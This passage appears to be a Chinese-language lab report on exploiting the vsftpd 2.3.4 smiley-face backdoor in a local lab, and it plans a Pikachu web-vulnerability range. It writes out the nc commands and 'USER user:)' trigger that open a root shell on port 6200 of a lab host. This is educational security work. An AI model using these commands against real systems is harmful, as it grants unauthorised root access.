一、 实验背景与目标
本次实验旨在通过实际编写 PoC（概念验证）和搭建本地靶场，深入理解常见的网络安全漏洞。具体任务包括：

编写 Python PoC 检测并利用 vsftpd 2.3.4 笑脸漏洞。

使用 Docker 搭建皮卡丘（Pikachu） Web 漏洞练习靶场。

个人尝试通关靶场关卡（以 SQL 注入为例）。

深入源码分析漏洞成因，并给出修复方案。

二、笑脸漏洞（vsftpd 2.3.4）PoC 编写与利用

  1. 漏洞原理
    vsftpd 2.3.4 版本源码中被恶意植入了后门。当用户尝试登录时，如果用户名包含笑脸符号 :)，服务器会在后台执行恶意代码，悄悄在 6200 端口 开启一个拥有 root 权限的 Shell。攻击者无需密码即可直接控制服务器。

  2. PoC 脚本编写
    在 Kali Linux 环境下，我使用 Python 的 socket 模块编写了轻量级检测脚本。核心逻辑是向 21 端口发送包含 USER user:) 和 PASS pass 的指令触发后门，随后检测 6200 端口是否被激活。

  3. 漏洞利用实战
    为了避免自动化脚本因时序问题失败，我采用了手动触发的方式。

使用 nc 192.168.19.129 21 连接 FTP 服务。

手动输入用户名 USER user:) 和密码 PASS pass 触发后门。

断开连接后，立刻使用 nc 192.168.19.129 6200 连接后门端口。

执行 whoami 命令，成功返回 root，证明已获取靶机最高权限。

图注：成功触发后门并获取 Root 权限
